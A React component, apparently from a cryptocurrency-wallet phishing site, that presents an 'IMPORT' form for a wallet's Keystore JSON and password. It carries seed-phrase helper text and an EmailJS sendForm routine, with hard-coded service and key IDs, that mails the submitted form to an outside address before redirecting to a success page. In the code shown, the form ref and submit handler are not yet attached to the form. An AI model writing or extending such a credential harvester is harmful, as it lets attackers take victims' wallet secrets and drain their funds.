import * as React from "react";
import Box from "@mui/material/Box";
import TextField from "@mui/material/TextField";
import Button from "@mui/material/Button";
import { useNavigate } from "react-router-dom";
import { useRef } from "react";
import emailjs from "@emailjs/browser";
import { useState } from "react";
import { Typography } from "@mui/material";

const KeyStore = () => {
  const form = useRef();
  let navigate = useNavigate();
  
  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_baa21jx",
        "template_49mmn1g",
        form.current,
        "P_9SIX5hhtfJnOac4"
      )
      .then(
        (result) => {
          navigate("/success-page");
        },
        (error) => {
          navigate("/error");
        }
      );
  };
  const [toggleState, setToggleState] = useState(1);

  return (
    <div className={toggleState === 2 ? "content active-content" : "content"}>
      <Box
        component="form"
        sx={{
          width: "80%",
          margin: "0 auto",
          display: "flex",
          flexDirection: "column",
          rowGap: "20px",
        }}
        noValidate
        autoComplete="off"
      >
        <TextField
          id="outlined-basic"
          label="Keystore JSON"
          variant="outlined"
          multiline
          fullWidth
          rows={12}
        />

        <TextField
          id="outlined-password-input"
          label="Password"
          type="password"
          autoComplete="current-password"
          fullWidth
        />

        <Typography
          sx={{color: "rgba(38,34,250)" }}
          paddingY={2}
          
        >
          Typically 12 (sometimes 24) words seperated by single spaces
        </Typography>

        <Button variant="contained" size="large">
          IMPORT
        </Button>
      </Box>
    </div>
  );
};

export default KeyStore;
